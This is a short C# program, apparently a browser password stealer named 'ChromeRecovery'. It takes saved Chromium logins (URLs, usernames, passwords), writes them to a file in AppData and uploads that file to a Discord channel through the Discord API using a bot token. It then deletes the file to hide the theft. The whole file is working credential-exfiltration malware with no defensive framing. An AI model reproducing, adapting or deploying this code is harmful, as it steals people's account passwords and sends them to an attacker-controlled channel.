using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Net;





namespace ChromeRecovery
{
    class Program
    {
        static void Main(string[] args)
        {

            string channelid = "Discord Channel ID Here";
            string token = "Discord Token Here";

            var a = Chromium.Grab();

            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\patso.txt";

            using (StreamWriter writer = new StreamWriter(path))
            {
                foreach (var b in a)
                {
                    writer.Write("Url: " + b.URL + "\n");
                    writer.Write("Username: " + b.UserName + "\n");
                    writer.Write("Password: " + b.Password + "\n");
                    writer.Write("Application: " + b.Application + "\n");
                    writer.Write("=============================" + "\n");
                }
            }

            string URI = "https://discord.com/api/v9/channels/" + channelid + "/messages";
            string myParameters;
            string method = "POST";

            using (WebClient wc = new WebClient())
            {
                wc.Headers.Set("Authorization", token);
                wc.Headers.Set("Content-Type", "text/plain");


                wc.UploadFile(URI, method, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\patso.txt");

            }

            System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\patso.txt");

        }
    }
}